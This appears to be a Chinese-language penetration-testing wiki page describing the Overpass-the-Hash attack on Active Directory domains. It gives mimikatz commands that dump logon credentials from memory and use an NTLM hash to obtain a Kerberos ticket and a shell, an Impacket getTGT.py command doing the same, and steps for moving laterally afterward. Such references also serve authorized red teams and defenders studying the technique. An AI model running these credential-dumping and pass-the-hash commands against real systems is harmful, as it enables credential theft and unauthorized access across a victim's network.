---
description: 适用于当前目标环境不允许使用NTLM进行身份验证 / 需要切换到用Kerberos票据认证
---

# ✔️ 绕过哈希 - Overpass The Hash

## 先决条件

* 需要获得目标用户账户的NTLM哈希
* 需要至少在目标域中已建立了基本立足点
* 目标域必须支持Kerberos身份验证机制
* 目标域禁止了NTLM身份验证机制

## 常用工具

### mimikatz.exe

```powershell
mimikatz.exe
# 获取当前用户账户的NTLM哈希
sekurlsa::logonpasswords
# 利用输出信息中的NTLM字段中的哈希值进行接下来的绕过哈希攻击(此处指定运行powershell程序)
sekurlsa::pth /user:用户名 /domain:target.com /ntlm:e3fh34..........4059hd /run:powershell.exe
```

```powershell
# 检查缓存的Kerberos票据
klist
# 如果没有任何票据信息的输出，则意味着当前的用户没有向域控进行过身份验证，所以只要登录依次就可以了
net use \\dc01
klist
# 从输出的票据中查看获取到的TGT/TGS票据，接下来可以横向移动了
```

### Impacket

* 常用脚本：**getTGT.py**

```bash
# [域名/用户名@域控]
python3 getTGT.py target.com/administrator@dc01.target.com -hashes :e3fh34..........4059hd
```

## 攻击步骤

* 使用mimikatz或者本地提权来获取到当前用户账户的NTLM哈希
* 使用mimikatz通过已获取的NTLM哈希来请求Kerberos认证服务，获取Kerberos TGT票据
* 使用 Kerberos TGT进行身份验证，借此来进行横向移动或者访问其他服务

{% hint style="info" %}
* 绕过哈希攻击的核心是滥用目标用户账户的NTLM哈希以获取到Kerberos TGT票据，从而绕过NTLM身份验证机制，直接使用Kerberos票据进行身份认证，并借此在目标内网中进行横向移动或者访问其他服务。其本质是绕过了哈希认证，转而使用了票据认证。
{% endhint %}
